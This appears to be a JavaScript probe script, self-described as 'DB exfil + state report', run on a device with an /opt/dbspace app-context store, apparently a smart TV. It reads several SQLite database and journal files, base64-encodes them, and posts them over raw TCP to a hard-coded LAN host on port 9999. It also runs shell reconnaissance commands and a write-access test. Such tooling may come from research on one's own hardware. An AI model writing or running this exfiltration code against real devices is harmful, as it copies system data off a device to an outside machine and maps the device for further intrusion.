"use strict";

/* p82 (Probe2 v8): DB exfil + state report
   - read /opt/dbspace DBs (fs or execSync+base64) -> b64 -> POST to Mac :9999
   - journal state, ls -la /opt/dbspace, smack, counts
*/

var fs = null, cp = null, net = null;
var haveFs = false, haveCp = false, haveNet = false;
try { fs = require('fs'); haveFs = true; } catch (e) {}
try { cp = require('child_process'); haveCp = true; } catch (e) {}
try { net = require('net'); haveNet = true; } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var LIVE = '/opt/dbspace/.app-context.db';
var V2 = '/opt/dbspace/.app-context_2.db';
var V3 = '/opt/dbspace/.app-context_3.db';
var JRN = '/opt/dbspace/.app-context.db-journal';

var LOG = [];
function L(s) { LOG.push(String(s)); try { console.log(s); } catch (e) {} }

function run(cmd, timeout) {
  try {
    return cp.execSync(cmd, { timeout: timeout || 20000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
  } catch (e) {
    var out = '';
    if (e.stdout) out += e.stdout.toString();
    if (e.stderr) out += (out ? '\n' : '') + e.stderr.toString();
    return '[err] ' + (out || (e && e.message) || 'unknown');
  }
}

function b64Of(path) {
  if (haveFs) {
    try {
      var buf = fs.readFileSync(path);
      var out = '';
      var CH = 0x8000;
      var u = new Uint8Array(buf);
      for (var o = 0; o < u.length; o += CH) out += String.fromCharCode.apply(null, u.subarray(o, o + CH));
      return { ok: true, b64: btoa(out), size: u.length, via: 'fs' };
    } catch (e) { L('b64Of fs fail ' + path + ': ' + e); }
  }
  var r = run('cat ' + path + ' 2>/dev/null | base64 -w0 2>/dev/null || cat ' + path + ' 2>/dev/null | base64', 30000);
  if (r && r.length > 100 && r.indexOf('err') < 0) return { ok: true, b64: r, size: -1, via: 'exec' };
  return { ok: false, err: (r || 'no reader').substring(0, 200) };
}

function postRaw(path, text) {
  var ev = [];
  if (!haveNet) return 'no net';
  var t0 = Date.now();
  var buf = new Buffer(text, 'utf8');
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: text/plain\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  var sock = null;
  try { sock = net.connect(PORT, HOST); } catch (e) { return 'ctor ' + e.message; }
  var started = false;
  sock.on('connect', function () {
    if (started) return;
    started = true;
    ev.push('connect');
    try { sock.write(hdr); } catch (e) { ev.push('hdr ' + e.message); }
    var off = 0;
    var iv = setInterval(function () {
      if (off >= buf.length) {
        clearInterval(iv);
        ev.push('body complete');
        setTimeout(function () { try { sock.destroy(); } catch (e) {} }, 3000);
        return;
      }
      try { sock.write(buf.slice(off, off + 4096)); } catch (e) { ev.push('chunk ' + e.message); }
      off += 4096;
    }, 100);
  });
  sock.on('error', function (e) { ev.push('error ' + e.message); });
  sock.on('close', function () { ev.push('close'); });
  setTimeout(function () { ev.push('timeout-destroy'); try { sock.destroy(); } catch (e) {} }, 60000);
  return ev.join('|');
}

function doWork() {
  var R = { ts: new Date().toISOString(), probe: 'p82', modules: { fs: haveFs, cp: haveCp, net: haveNet }, results: {}, log: [] };
  function rep(k, v) { R.results[k] = v; L(k + ' = ' + JSON.stringify(v).substring(0, 200)); }

  rep('modules', R.modules);
  rep('ls_dbspace', run('ls -la /opt/dbspace/ 2>&1 | head -30', 15000).substring(0, 3000));
  rep('md5', run('md5sum /opt/dbspace/.app-context.db /opt/dbspace/.app-context_2.db /opt/dbspace/.app-context_3.db /opt/dbspace/.app-context.db-journal 2>&1', 15000).substring(0, 1000));
  rep('counts', run('sqlite3 /opt/dbspace/.app-context.db "SELECT COUNT(*) FROM key_filter; SELECT COUNT(*) FROM managed_app;" 2>&1', 20000).substring(0, 300));
  rep('home_rows', run('sqlite3 /opt/dbspace/.app-context.db "SELECT appid, on_selector FROM key_filter WHERE key = \'XF86Home\';" 2>&1', 20000).substring(0, 1500));

  var lv = b64Of(LIVE);
  rep('live', { ok: lv.ok, size: lv.size, via: lv.via, b64len: lv.b64 ? lv.b64.length : 0 });
  if (lv.ok) postRaw('/p8live', JSON.stringify({ ts: R.ts, path: LIVE, size: lv.size, via: lv.via, b64: lv.b64 }));

  var v2 = b64Of(V2);
  rep('v2', { ok: v2.ok, size: v2.size, via: v2.via, b64len: v2.b64 ? v2.b64.length : 0 });
  if (v2.ok) postRaw('/p8v2', JSON.stringify({ ts: R.ts, path: V2, size: v2.size, via: v2.via, b64: v2.b64 }));

  var v3 = b64Of(V3);
  rep('v3', { ok: v3.ok, size: v3.size, via: v3.via, b64len: v3.b64 ? v3.b64.length : 0 });
  if (v3.ok) postRaw('/p8v3', JSON.stringify({ ts: R.ts, path: V3, size: v3.size, via: v3.via, b64: v3.b64 }));

  var jn = b64Of(JRN);
  rep('journal', { ok: jn.ok, size: jn.size, via: jn.via, b64len: jn.b64 ? jn.b64.length : 0 });
  if (jn.ok) postRaw('/p8journal', JSON.stringify({ ts: R.ts, path: JRN, size: jn.size, via: jn.via, b64: jn.b64 }));

  rep('write_test_dbspace', run('echo p82test > /opt/dbspace/.p82_write_test 2>&1 && echo W_OK || echo W_FAIL', 10000).substring(0, 200));
  rep('final', 'done ' + new Date().toISOString());
  postRaw('/p8info', JSON.stringify(R));
  L('p82 finished');
}

doWork();
